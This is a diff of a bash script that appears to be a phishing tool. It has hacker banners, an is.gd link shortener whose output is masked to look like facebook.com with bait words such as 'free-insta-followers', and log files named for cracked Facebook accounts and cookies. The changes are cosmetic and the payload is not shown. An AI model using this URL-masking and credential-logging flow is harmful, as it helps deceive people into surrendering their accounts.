@@ -165,7 +165,7 @@ while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
 for i in "${spinner[@]}"
 do
 	tput civis
-	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m Executing Firewall ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
+	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m Online Hacking Server ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
 	sleep $delay
 	printf "\b\b\b\b\b\b\b\b";
 done
@@ -229,7 +229,7 @@ echo -e "\e[95m
      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
 echo 
 echo -e $'\e[1;32m        =======================================           \e[0m'
-echo -e $'         \e[1;37;41m    c r e a t e d  b y  S u m a n      \e[m '
+echo -e $'         \e[1;37;41m   c r e a t e d  b y  S u m a n      \e[m '
 echo -e $'\e[1;32m        =======================================           \e[0m '
 echo 
 banner(){
@@ -270,7 +270,7 @@ ash() {
         short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
         shorter=${short#https://}
         echo
-        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m] :\e[m ' mask
+        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m ] :\e[m ' mask
         echo
         url_checker $mask
         echo -e "\e[1;96m>>\e[1;93m Enter some words you like to mention in url \e[1;92m[\e[1;92mEx.free-insta-followers\e[1;92m] \e[m "
@@ -357,7 +357,7 @@ ash1() {
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m========================= \e[92m"
                            echo 
 			   touch log.txt >> /dev/null 2>&1
-                           tail -f cok.txt 
+                           tail -f log.txt 
 
                            break;
 
@@ -389,7 +389,7 @@ ash1() {
 			   echo 
 	        	   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m========================= \e[92m"
 			   echo
-			   touch log.txt >> /dev/null 2>&1
+			   touch fbcracked.txt >> /dev/null 2>&1
 			   tail -f fbcracked.txt
 			   
                            break;
